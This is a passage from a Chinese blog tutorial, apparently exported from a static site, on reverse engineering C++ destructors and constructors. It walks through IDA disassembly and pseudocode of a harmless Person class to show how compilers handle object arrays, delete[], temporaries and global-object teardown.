&#123;\t\tage = 20;\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* objs = new Person[3]; //申请对象数组\tdelete[] objs; //释放对象数组\treturn 0;&#125;\n\n\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115.text:004010C0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010C0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010C0.text:004010C0 var_24          = dword ptr -24h.text:004010C0 var_20          = dword ptr -20h.text:004010C0 var_1C          = dword ptr -1Ch.text:004010C0 var_18          = dword ptr -18h.text:004010C0 var_14          = dword ptr -14h.text:004010C0 Block           = dword ptr -10h.text:004010C0 var_C           = dword ptr -0Ch.text:004010C0 var_4           = dword ptr -4.text:004010C0 argc            = dword ptr  8.text:004010C0 argv            = dword ptr  0Ch.text:004010C0 envp            = dword ptr  10h.text:004010C0.text:004010C0 ; FUNCTION CHUNK AT .text:00402200 SIZE 0000000F BYTES.text:004010C0 ; FUNCTION CHUNK AT .text:00402214 SIZE 0000001D BYTES.text:004010C0.text:004010C0 ; __unwind &#123; // _main_SEH.text:004010C0                 push    ebp.text:004010C1                 mov     ebp, esp.text:004010C3                 push    0FFFFFFFFh.text:004010C5                 push    offset _main_SEH.text:004010CA                 mov     eax, large fs:0.text:004010D0                 push    eax.text:004010D1                 sub     esp, 18h.text:004010D4                 mov     eax, ___security_cookie.text:004010D9                 xor     eax, ebp.text:004010DB                 push    eax.text:004010DC                 lea     eax, [ebp-0Ch].text:004010DF                 mov     large fs:0, eax.text:004010E5                 push    10h             ; 每个对象占4字节，却申请了16字节大小的空间，多出的4字节数据是什么呢？.text:004010E5                                         ; 在申请对象数组时，会使用堆空间的首地址处的4字节内容保存对象总个数.text:004010E7                 call    sub_401368      ; 调用new函数.text:004010EC                 add     esp, 4.text:004010EF                 mov     [ebp-10h], eax  ; [ebp-10h]保存申请的堆空间的首地址.text:004010F2 ;   try &#123;.text:004010F2                 mov     dword ptr [ebp-4], 0.text:004010F9                 cmp     dword ptr [ebp-10h], 0 ; 检查堆空间的申请是否成功.text:004010FD                 jz      short loc_40112D ; 申请堆空间失败，赋值空指针.text:004010FF                 mov     eax, [ebp-10h].text:00401102                 mov     dword ptr [eax], 3 ; 设置首地址的4字节数据为对象个数.text:00401108                 push    offset sub_4010A0 ; 参数5，析构函数的地址，作为构造代理函数参数.text:0040110D                 push    offset sub_401080 ; 参数4，构造函数的地址，作为构造代理函数参数.text:00401112                 push    3               ; 参数3，对象个数，作为函数参数.text:00401114                 push    4               ; 参数2，对象大小，作为函数参数.text:00401116                 mov     ecx, [ebp-10h].text:00401119                 add     ecx, 4          ; 跳过首地址的4字节数据.text:0040111C                 push    ecx             ; 参数1，第一个对象地址，作为函数参数.text:0040111D                 call    ??_L@YGXPAXIIP6EX0@Z1@Z ; `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *)) ; 构造函数迭代器.text:00401122                 mov     edx, [ebp-10h].text:00401125                 add     edx, 4          ; 跳过堆空间首4字节的数据.text:00401128                 mov     [ebp-14h], edx  ; 保存堆空间中的第一个对象的首地址.text:0040112B                 jmp     short loc_401134 ; 跳过申请堆空间失败的处理.text:0040112D ; ---------------------------------------------------------------------------.text:0040112D.text:0040112D loc_40112D:                             ; CODE XREF: _main+3D↑j.text:0040112D                 mov     dword ptr [ebp-14h], 0 ; 申请堆空间失败，赋值空指针.text:00401134.text:00401134 loc_401134:                             ; CODE XREF: _main+6B↑j.text:00401134                 mov     eax, [ebp-14h].text:00401137                 mov     [ebp-1Ch], eax.text:00401137 ;   &#125; // starts at 4010F2.text:0040113A                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401141                 mov     ecx, [ebp-1Ch].text:00401144                 mov     [ebp-20h], ecx.text:00401147                 mov     edx, [ebp-20h].text:0040114A                 mov     [ebp-18h], edx  ; 数据最后到objs，打开02就简洁了.text:0040114D                 cmp     dword ptr [ebp-18h], 0.text:00401151                 jz      short loc_401162 ; 检查对象指针是否为NULL.text:00401153                 push    3               ; 参数2，释放对象类型标志.text:00401153                                         ; 1为单个对象，3为释放对象数组.text:00401153                                         ; 0表示仅执行析构函数，不释放堆空间（其作用会在讲解多重继承时详细介绍）.text:00401153                                         ; 这个标志占2位，使用delete[]时标志为二进制11，直接用delete为二进制01.text:00401155                 mov     ecx, [ebp-18h]  ; 参数1，释放堆对象首地址.text:00401158                 call    ??_E?$ComPtr@UIUnknown@@@WRL@Microsoft@@QAEPAXI@Z ; Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint).text:00401158                                         ; 释放堆对象函数，该函数有两个参数.text:0040115D                 mov     [ebp-24h], eax.text:00401160                 jmp     short loc_401169.text:00401162 ; ---------------------------------------------------------------------------.text:00401162.text:00401162 loc_401162:                             ; CODE XREF: _main+91↑j.text:00401162                 mov     dword ptr [ebp-24h], 0.text:00401169.text:00401169 loc_401169:                             ; CODE XREF: _main+A0↑j.text:00401169                 xor     eax, eax.text:0040116B                 mov     ecx, [ebp-0Ch].text:0040116E                 mov     large fs:0, ecx.text:00401175                 pop     ecx.text:00401176                 mov     esp, ebp.text:00401178                 pop     ebp.text:00401179                 retn.text:00401179 ; &#125; // starts at 4010C0.text:00401179 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _DWORD *v4; // [esp+14h] [ebp-14h]  _DWORD *Block; // [esp+18h] [ebp-10h]  Block = (_DWORD *)sub_401368(16);  if ( Block )  &#123;    *Block = 3;    `eh vector constructor iterator&#x27;(Block + 1, 4u, 3u, sub_401080, (void (__thiscall *)(void *))sub_4010A0);    v4 = Block + 1;  &#125;  else  &#123;    v4 = 0;  &#125;  if ( v4 )    Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(3);  return 0;&#125;\n\n\n\n根据上面的代码可以知道，在申请对象数组时，由于对象都在同一个堆空间中，32位程序编译器使用了堆空间的前4字节数据保存对象的总个数，64位程序编译器使用了堆空间的前8字节数据保存对象的总个数。正是因为多出来的这些空间，许多初学者在申请对象数组时使用了new []，而在释放对象的过程中没有使用delete []（使用的是delete），于是产生了堆空间释放的错误。在使用delete（不使用delete []）的情况下，当数组元素为基本数据类型时不会出错，但是当数组元素为存在析构函数的对象时就会出错\n在VS中，由于类对象与其他基本数据类型不同，在对象产生时，需要调用构造函数来初始化对象中的数据，所以用到了代理函数。代理函数的功能是根据对象数组的元素逐个调用它们的构造函数，完成初始化过程。GCC和Clang虽然没有使用代理函数，但是功能和代理函数一致。\n堆对象数组的构造函数初始化代码12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 20;\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* objs = new Person[3]; //申请对象数组\tdelete[] objs; //释放对象数组\treturn 0;&#125;\n\nida汇编及伪代码视图（main函数见上一节，堆对象数组的构造函数初始化代码）：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091//构造代理函数有5个参数//第一个对象地址、对象大小、对象个数、构造函数的地址、析构函数的地址.text:00401371 ; void __stdcall `eh vector constructor iterator&#x27;(char *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *)).text:00401371 ??_L@YGXPAXIIP6EX0@Z1@Z proc near       ; CODE XREF: _main+5D↑p.text:00401371.text:00401371 var_20          = dword ptr -20h.text:00401371 var_19          = byte ptr -19h.text:00401371 ms_exc          = CPPEH_RECORD ptr -18h.text:00401371 arg_0           = dword ptr  8.text:00401371 arg_4           = dword ptr  0Ch.text:00401371 arg_8           = dword ptr  10h.text:00401371 arg_C           = dword ptr  14h.text:00401371 arg_10          = dword ptr  18h.text:00401371.text:00401371 ; __unwind &#123; // __SEH_prolog4.text:00401371                 push    10h.text:00401373                 push    offset stru_4037D8.text:00401378                 call    __SEH_prolog4.text:0040137D                 xor     ebx, ebx.text:0040137F                 mov     [ebp+var_20], ebx.text:00401382                 mov     [ebp+var_19], bl.text:00401385 ;   __try &#123; // __finally(loc_4013CB).text:00401385                 mov     [ebp+ms_exc.registration.TryLevel], ebx.text:00401388.text:00401388 loc_401388:                             ; CODE XREF: `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *))+35↓j.text:00401388                 cmp     ebx, [ebp+arg_8] ; 判断对象个数是否为0.text:0040138B                 jz      short loc_4013A8.text:0040138D                 mov     ecx, [ebp+arg_C] ; 获取构造函数地址并保存到ecx中.text:00401390                 call    ds:___guard_check_icall_fptr ; guard_check_icall_fptr 是CFG保护开启才有的保护函数；这个函数里面，将会去判断 ecx 这个地址里的调用函数是不是一个合法的函数。.text:00401396                 mov     ecx, [ebp+arg_0] ; 获取对象所在堆空间的首地址，使用ecx传递this指针.text:00401399                 call    [ebp+arg_C]     ; 调用构造函数.text:0040139C                 mov     eax, [ebp+arg_4].text:0040139F                 add     [ebp+arg_0], eax ; 修改指针，使其指向下一对象的首地址.text:004013A2                 inc     ebx.text:004013A3                 mov     [ebp+var_20], ebx.text:004013A6                 jmp     short loc_401388 ; 判断对象个数是否为0.text:004013A8 ; ---------------------------------------------------------------------------.text:004013A8.text:004013A8 loc_4013A8:                             ; CODE XREF: `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *))+1A↑j.text:004013A8                 mov     al, 1.text:004013AA                 mov     [ebp+var_19], al.text:004013AA ;   &#125; // starts at 401385.text:004013AD                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh.text:004013B4                 call    loc_4013D1.text:004013B9 ; ---------------------------------------------------------------------------.text:004013B9.text:004013B9 loc_4013B9:                             ; CODE XREF: `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *)):loc_4013E4↓j.text:004013B9                 mov     ecx, [ebp+ms_exc.registration.Next].text:004013BC                 mov     large fs:0, ecx.text:004013C3                 pop     ecx.text:004013C4                 pop     edi.text:004013C5                 pop     esi.text:004013C6                 pop     ebx.text:004013C7                 leave.text:004013C8                 retn    14h.text:004013CB ; ---------------------------------------------------------------------------.text:004013CB.text:004013CB loc_4013CB:                             ; DATA XREF: .rdata:stru_4037D8↓o.text:004013CB ;   __finally // owned by 401385.text:004013CB                 mov     ebx, [ebp+var_20].text:004013CE                 mov     al, [ebp+var_19].text:004013D1.text:004013D1 loc_4013D1:                             ; CODE XREF: `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *))+43↑j.text:004013D1                 test    al, al.text:004013D3                 jnz     short loc_4013E4.text:004013D5                 push    [ebp+arg_10]    ; 析构函数地址.text:004013D8                 push    ebx             ; unsigned int.text:004013D9                 push    [ebp+arg_4]     ; unsigned int.text:004013DC                 push    [ebp+arg_0]     ; void *.text:004013DF                 call    ?__ArrayUnwind@@YGXPAXIIP6EX0@Z@Z ; __ArrayUnwind(void *,uint,uint,void (*)(void *)) ; 如果某个构造函数产生异常，则进行栈解退，用到析构函数.text:004013E4.text:004013E4 loc_4013E4:                             ; CODE XREF: `eh vector constructor iterator&#x27;(void *,uint,uint,void (*)(void *),void (*)(void *))+62↑j.text:004013E4                 retn.text:004013E4 ; &#125; // starts at 401371.text:004013E4 ??_L@YGXPAXIIP6EX0@Z1@Z endpvoid __stdcall `eh vector constructor iterator&#x27;(        char *a1,        unsigned int a2,        unsigned int a3,        void (__thiscall *a4)(void *),        void (__thiscall *a5)(void *))&#123;  int i; // ebx  for ( i = 0; i != a3; ++i )  &#123;    a4(a1);    a1 += a2;  &#125;&#125;\n\n上面展示了申请多个堆对象构造函数的调用过程。在Release版下，编译器产生了循环结构的代码，根据数组中对象的总个数，从堆数组中的第一个对象首地址开始，依次向后遍历数组中的每个对象，将数组中每个对象的首地址作为this指针逐个调用构造函数。\n堆对象释放代码分析12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 20;\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()\\n&quot;);\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* objs = new Person[3]; //申请对象数组\tdelete[] objs; //释放对象数组\treturn 0;&#125;\n\nida汇编及伪代码视图（main函数见上一节，这里只分析堆对象释放代码）：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196//释放堆对象函数，该函数有两个参数：//释放堆对象首地址（通过ecx传递）//释放对象类型标志（1为单个对象，3为释放对象数组，0表示仅执行析构函数，不释放堆空间，此处为3）.text:00401180 ; char *__thiscall Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(char *this, char).text:00401180 ??_E?$ComPtr@UIUnknown@@@WRL@Microsoft@@QAEPAXI@Z proc near.text:00401180                                         ; CODE XREF: _main+98↑p.text:00401180.text:00401180 Block           = dword ptr -10h.text:00401180 var_C           = dword ptr -0Ch.text:00401180 arg_0           = dword ptr  8.text:00401180 arg_4           = dword ptr  0Ch.text:00401180.text:00401180 ; FUNCTION CHUNK AT .text:00402240 SIZE 0000001D BYTES.text:00401180.text:00401180 ; __unwind &#123; // SEH_401180.text:00401180                 push    ebp.text:00401181                 mov     ebp, esp.text:00401183                 push    0FFFFFFFFh.text:00401185                 push    offset SEH_401180.text:0040118A                 mov     eax, large fs:0.text:00401190                 push    eax.text:00401191                 push    ecx.text:00401192                 mov     eax, ___security_cookie.text:00401197                 xor     eax, ebp.text:00401199                 push    eax.text:0040119A                 lea     eax, [ebp+var_C].text:0040119D                 mov     large fs:0, eax.text:004011A3                 mov     [ebp+Block], ecx.text:004011A6                 mov     eax, [ebp+arg_0].text:004011A9                 and     eax, 2          ; 判断释放标志，是否为对象数组.text:004011AC                 jz      short loc_4011F2.text:004011AE                 push    offset sub_4010A0 ; 参数4，析构函数地址，作为析构代理函数参数使用.text:004011B3                 mov     ecx, [ebp+Block] ; 获取第一个对象的首地址.text:004011B6                 mov     edx, [ecx-4]    ; 获取对象个数.text:004011B9                 push    edx             ; 参数3，堆空间中的对象总数.text:004011BA                 push    4               ; 参数2，每个对象大小.text:004011BC                 mov     eax, [ebp+Block].text:004011BF                 push    eax             ; 参数1，对象的首地址.text:004011C0                 call    ??_M@YGXPAXIIP6EX0@Z@Z ; `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *))，析构函数迭代器.text:004011C5                 mov     ecx, [ebp+arg_0] ; 获取释放标志.text:004011C8                 and     ecx, 1.text:004011CB                 jz      short loc_4011EA ; 检查是否释放堆空间.text:004011CD                 mov     edx, [ebp+Block].text:004011D0                 mov     eax, [edx-4].text:004011D3                 lea     ecx, ds:4[eax*4].text:004011DA                 push    ecx.text:004011DB                 mov     edx, [ebp+Block].text:004011DE                 sub     edx, 4.text:004011E1                 push    edx             ; Block，修正为堆空间的首地址.text:004011E2                 call    sub_401237      ; 调用delete函数释放堆空间.text:004011E7                 add     esp, 8.text:004011EA.text:004011EA loc_4011EA:                             ; CODE XREF: Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint)+4B↑j.text:004011EA                 mov     eax, [ebp+Block].text:004011ED                 sub     eax, 4.text:004011F0                 jmp     short loc_401213.text:004011F2 ; ---------------------------------------------------------------------------.text:004011F2.text:004011F2 loc_4011F2:                             ; CODE XREF: Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint)+2C↑j.text:004011F2                 mov     ecx, [ebp+Block] ; 参数1，对象的首地址.text:004011F5                 call    sub_4010A0      ; 调用析构函数.text:004011FA                 mov     eax, [ebp+arg_0] ; 获取释放标志.text:004011FD                 and     eax, 1.text:00401200                 jz      short loc_401210 ; 检查是否释放堆空间.text:00401202                 push    4.text:00401204                 mov     ecx, [ebp+Block].text:00401207                 push    ecx             ; Block.text:00401208                 call    sub_40135A      ; 调用delete释放堆空间.text:0040120D                 add     esp, 8.text:00401210.text:00401210 loc_401210:                             ; CODE XREF: Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint)+80↑j.text:00401210                 mov     eax, [ebp+Block].text:00401213.text:00401213 loc_401213:                             ; CODE XREF: Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint)+70↑j.text:00401213                 mov     ecx, [ebp+var_C].text:00401216                 mov     large fs:0, ecx.text:0040121D                 pop     ecx.text:0040121E                 mov     esp, ebp.text:00401220                 pop     ebp.text:00401221                 retn    4.text:00401221 ; &#125; // starts at 401180.text:00401221 ??_E?$ComPtr@UIUnknown@@@WRL@Microsoft@@QAEPAXI@Z endpchar *__thiscall Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(char *this, char a2)&#123;  if ( (a2 &amp; 2) != 0 )  &#123;    `eh vector destructor iterator&#x27;(this, 4u, *((_DWORD *)this - 1), (void (__thiscall *)(void *))sub_4010A0);    if ( (a2 &amp; 1) != 0 )      sub_401237(this - 4);    return this - 4;  &#125;  else  &#123;    sub_4010A0((char)this);    if ( (a2 &amp; 1) != 0 )      sub_40135A(this);    return this;  &#125;&#125;//析构函数迭代器，有四个参数：//对象的首地址、每个对象大小、堆空间中的对象总数、析构函数地址.text:00401245 ; void __stdcall `eh vector destructor iterator&#x27;(char *, unsigned int, unsigned int, void (__thiscall *)(void *)).text:00401245 ??_M@YGXPAXIIP6EX0@Z@Z proc near        ; CODE XREF: Microsoft::WRL::ComPtr&lt;IUnknown&gt;::`vector deleting destructor&#x27;(uint)+40↑p.text:00401245.text:00401245 var_19          = byte ptr -19h.text:00401245 ms_exc          = CPPEH_RECORD ptr -18h.text:00401245 arg_0           = dword ptr  8.text:00401245 arg_4           = dword ptr  0Ch.text:00401245 arg_8           = dword ptr  10h.text:00401245 arg_C           = dword ptr  14h.text:00401245.text:00401245 ; __unwind &#123; // __SEH_prolog4.text:00401245                 push    0Ch.text:00401247                 push    offset stru_403798.text:0040124C                 call    __SEH_prolog4.text:00401251                 mov     [ebp+var_19], 0.text:00401255                 mov     ebx, [ebp+arg_4] ; 获取对象大小.text:00401258                 mov     eax, ebx.text:0040125A                 mov     edi, [ebp+arg_8] ; 获取堆空间中的对象总数.text:0040125D                 imul    eax, edi        ; 计算对象数组大小.text:00401260                 mov     esi, [ebp+arg_0] ; 获取对象的首地址.text:00401263                 add     esi, eax.text:00401265                 mov     [ebp+arg_0], esi ; 定位到对象数组的末尾.text:00401268 ;   __try &#123; // __finally(loc_4012AE).text:00401268                 and     [ebp+ms_exc.registration.TryLevel], 0.text:0040126C.text:0040126C loc_40126C:                             ; CODE XREF: `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *))+44↓j.text:0040126C                 mov     eax, edi.text:0040126E                 dec     edi.text:0040126F                 mov     [ebp+arg_8], edi.text:00401272                 test    eax, eax.text:00401274                 jz      short loc_40128B.text:00401276                 sub     esi, ebx        ; 修正为第n个对象的首地址（从后往前）.text:00401278                 mov     [ebp+arg_0], esi.text:0040127B                 mov     ecx, [ebp+arg_C] ; 获取析构函数地址并保存到ecx中.text:0040127E                 call    ds:___guard_check_icall_fptr ; guard_check_icall_fptr 是CFG保护开启才有的保护函数；这个函数里面，将会去判断 ecx 这个地址里的调用函数是不是一个合法的函数。.text:00401284                 mov     ecx, esi        ; 获取对象所在堆空间的首地址，使用ecx传递this指针.text:00401286                 call    [ebp+arg_C]     ; 调用析构函数.text:00401289                 jmp     short loc_40126C.text:0040128B ; ---------------------------------------------------------------------------.text:0040128B.text:0040128B loc_40128B:                             ; CODE XREF: `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *))+2F↑j.text:0040128B                 mov     al, 1.text:0040128D                 mov     [ebp+var_19], al.text:0040128D ;   &#125; // starts at 401268.text:00401290                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh.text:00401297                 call    loc_4012BA.text:0040129C ; ---------------------------------------------------------------------------.text:0040129C.text:0040129C loc_40129C:                             ; CODE XREF: `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *)):loc_4012C9↓j.text:0040129C                 mov     ecx, [ebp+ms_exc.registration.Next].text:0040129F                 mov     large fs:0, ecx.text:004012A6                 pop     ecx.text:004012A7                 pop     edi.text:004012A8                 pop     esi.text:004012A9                 pop     ebx.text:004012AA                 leave.text:004012AB                 retn    10h.text:004012AE ; ---------------------------------------------------------------------------.text:004012AE.text:004012AE loc_4012AE:                             ; DATA XREF: .rdata:stru_403798↓o.text:004012AE ;   __finally // owned by 401268.text:004012AE                 mov     edi, [ebp+arg_8].text:004012B1                 mov     ebx, [ebp+arg_4].text:004012B4                 mov     esi, [ebp+arg_0].text:004012B7                 mov     al, [ebp+var_19].text:004012BA.text:004012BA loc_4012BA:                             ; CODE XREF: `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *))+52↑j.text:004012BA                 test    al, al.text:004012BC                 jnz     short loc_4012C9.text:004012BE                 push    [ebp+arg_C]     ; 析构函数地址.text:004012C1                 push    edi             ; unsigned int.text:004012C2                 push    ebx             ; unsigned int.text:004012C3                 push    esi             ; void *.text:004012C4                 call    ?__ArrayUnwind@@YGXPAXIIP6EX0@Z@Z ; __ArrayUnwind(void *,uint,uint,void (*)(void *))  ; 原型void __stdcall __ArrayUnwind(MyClass* objs,unsigned size,int count,void (__thiscall *pDtor)(void*))，第[count]对象由于没有构造成功，因此从[count-1]个对象开始析构，即如果某个析构函数产生异常，则跳过该对象，继续析构之前的对象.text:004012C9.text:004012C9 loc_4012C9:                             ; CODE XREF: `eh vector destructor iterator&#x27;(void *,uint,uint,void (*)(void *))+77↑j.text:004012C9                 retn.text:004012C9 ; &#125; // starts at 401245.text:004012C9 ??_M@YGXPAXIIP6EX0@Z@Z endpvoid __stdcall `eh vector destructor iterator&#x27;(        char *a1,        unsigned int a2,        unsigned int a3,        void (__thiscall *a4)(void *))&#123;  unsigned int v4; // edi  char *i; // esi  v4 = a3;  for ( i = &amp;a1[a3 * a2]; v4--; a4(i) )    i -= a2;&#125;\n\n\n\n上面的代码展示了申请多个堆对象析构函数的调用过程。在Release版下，编译器产生了循环结构的代码，根据数组中对象的总个数，从堆数组中的最后一个对象的首地址开始，依次向前遍历数组中的每个对象，将数组中每个对象的首地址作为this指针逐个调用析构函数。\n释放对象数组时，在delete函数后面添加符号“[]”是一个关键之处。单个对象的释放不可以添加符号“[]”，因为这样会把delete函数的目标指针减4或者8，释放单个对象的空间时就会发生错误，当执行到delete函数时会产生堆空间释放错误。\n对于以上堆内存格式，当使用new运算申请对象数组时，前4或者8字节空间用于记录数组内元素的个数，以便于执行每个数组元素的构造函数和析构函数。但是，对于基本数据类型来说，构造函数和析构函数的问题就不存在了，于是delete和delete[]的效果是一致的。出于代码可读性的考虑，建议读者在采用new申请对象时，如果是数组，则释放空间时就用delete[]，否则就用delete。\nC语言中的free函数与C++中的delete运算的区别很大，很重要的一点就是free不负责触发析构函数。同时，free不是运算符，无法进行运算符重载。\n参数对象和返回对象参数对象与返回对象会在不同的时机触发复制构造函数，它们的析构时机与所在作用域相关。只要函数的参数为对象类型，就会在函数调用结束后调用它的析构函数，然后释放参数对象所占的内存空间。返回值为对象的情况就不同了，返回对象时有赋值。\n1Person person = getObject();\n\n上述代码是把person的地址作为隐含参数传递给getObject()，在getObject()内部完成复制构造的过程。函数执行完毕后，person就已经构造完成了，所以析构函数由person的作用域决定\n当返回值为对象的函数遇到如下代码时：\n1person = getObject();\n\n因为这样的代码不是person在定义时赋初值，所以不会触发person的复制构造函数，这时候会产生临时对象作为getObject()的隐含参数，这个临时对象会在getObject()内部完成复制构造函数的过程。函数执行完毕后，如果Person的类中定义了“&#x3D;”运算符重载，则进行调用；否则根据对象成员逐个赋值。如果对象内数据量过大，就会调用rep movs这样的串操作指令批量赋值，这样的赋值方式属于浅拷贝。临时对象以一条高级语句为生命周期，它在函数调用时产生，在语句执行完毕时销毁。C和C++以分号作为语句的结束符，也就是说，一旦分号出现，就会触发临时对象的析构函数。特殊情况是，当引用这个临时对象时，它的生命期会和引用一致。又如：\n1Number = getNumber(), printf(&quot;Hello\\n&quot;);\n\n这是一条语句，逗号运算符后是printf调用，于是临时对象的析构在printf函数执行完毕后才会触发\n全局对象与静态对象全 局 对 象 与 静 态 对 象 相 同 ， 在 VS 中 其 构 造 函 数 在 函 数mainCRTStartup的_initterm调用中被构造。它们的析构函数的调用时机是在main()函数执行完毕之后。既然构造函数出现在初始化过程中，对应的析构函数就会出现在程序结束处。\n\n在main()函数调用结束后，由exit结束进程，从而终止程序的运行 。 全 局 对 象 的 析 构 函 数 调 用 也 在 其 中 ， 由 exit 函 数 内 的_execute_onexit_table实现，关键代码如下。\n12345678910_PVFV* saved_first = first;_PVFV* saved_last = last;for (;;)&#123;//从后向前依次释放全局对象_PVFV const function = __crt_fast_decode_pointer(*last);*last = encoded_nullptr;//调用保存的函数指着function();&#125;\n\n调用__crt_fast_decode_pointer函数可以获取保存各类资源释放函数的首地址。\n编译器是在何时保存函数指针的呢？\n全局构造函数的调用是在初始化函数内完成的。在执行每个全局对象构造代理函数时都会先执行对象的构造函数，然后使用atexit注册析构代理函数\n因为保存析构代理函数被定义为无参函数，所以在调用析构函数时无法传递this指针。于是编译器需要为每个全局对象和静态对象建立一个中间代理的析构函数，用于传入全局对象的this指针。\n在分析析构函数时，可以构造函数作为参照，但并非出现构造函数就一定会产生析构函数。在没有编写析构函数的类中，编译器会根据情况决定是否提供默认的析构函数。默认的构造函数和析构函数与虚函数的知识点紧密相关。\n小结析构函数的必要条件\n函数的调用是这个对象在作用域内的最后一次成员函数调用，分析this指针即可区分对象，是哪个对象的this指针就是哪个对象的成员函数。\n\n使用thiscall调用方式，使用ecx或者rcx传递this指针，没有返回值。\n\n\n","slug":"C++逆向——析构函数","date":"2023-02-09T01:22:15.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"da3425ec82161418a9e220cbb5402aa8","title":"构造函数和析构函数","content":"构造函数与析构函数是类重要的组成部分，在类中起到至关重要的作用。构造函数常用来完成对象生成时的数据初始化工作，而析构函数则常用于在对象销毁时释放对象申请的资源。当对象生成时，编译器会自动产生调用其类构造函数的代码，在编码过程中可以为类中的数据成员赋予恰当的初始值。当对象被销毁时，编译器同样会产生调用其类析构函数的代码。构造函数与析构函数都是类中特殊的成员函数，构造函数支持函数重载，而析构函数只能是一个无参函数。它们不可定义返回值，调用构造函数后，返回值为对象首地址，也就是this指针。在某些情况下，编译器会提供默认的构造函数和析构函数，但并不是任何情况下编译器都会提供。\n构造函数的出现时机对象生成时会自动调用构造函数。只要找到定义对象的地方就找到了构造函数的调用时机。这看似简单，实际情况却是不同作用域的对象生命周期不同，如局部对象、全局对象、静态对象等的生命周期各不相同，而当对象作为函数参数与返回值时，构造函数的出现时机又有所不同。\n局部对象局部对象下的构造函数出现时机比较容易识别。当对象产生时，便有可能引发构造函数的调用。\n无参构造函数的调用过程123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123; //无参构造函数\t\tage = 20;\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person; //类对象定义\treturn 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//main函数.text:00401020 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401020 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401020.text:00401020 var_8           = byte ptr -8.text:00401020 var_4           = dword ptr -4.text:00401020 argc            = dword ptr  8.text:00401020 argv            = dword ptr  0Ch.text:00401020 envp            = dword ptr  10h.text:00401020.text:00401020                 push    ebp.text:00401021                 mov     ebp, esp.text:00401023                 sub     esp, 8.text:00401026                 mov     eax, ___security_cookie.text:0040102B                 xor     eax, ebp.text:0040102D                 mov     [ebp-4], eax.text:00401030                 lea     ecx, [ebp-8]    ; 取得对象首地址，传入ecx作为参数，ecx=&amp;person.text:00401033                 call    sub_401000      ; 调用构造函数.text:00401038                 xor     eax, eax.text:0040103A                 mov     ecx, [ebp-4].text:0040103D                 xor     ecx, ebp        ; StackCookie.text:0040103F                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401044                 mov     esp, ebp.text:00401046                 pop     ebp.text:00401047                 retn.text:00401047 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[4]; // [esp+0h] [ebp-8h] BYREF  sub_401000(v4);  return 0;&#125;//构造函数.text:00401000 ; _DWORD *__thiscall sub_401000(_DWORD *this).text:00401000 sub_401000      proc near               ; CODE XREF: _main+13↓p.text:00401000.text:00401000 var_4           = dword ptr -4.text:00401000.text:00401000                 push    ebp.text:00401001                 mov     ebp, esp.text:00401003                 push    ecx.text:00401004                 mov     [ebp-4], ecx    ; [ebp-4]就是this指针.text:00401007                 mov     eax, [ebp-4]    ; eax保存了对象的首地址.text:0040100A                 mov     dword ptr [eax], 14h ; 将数据成员age设置为20.text:00401010                 mov     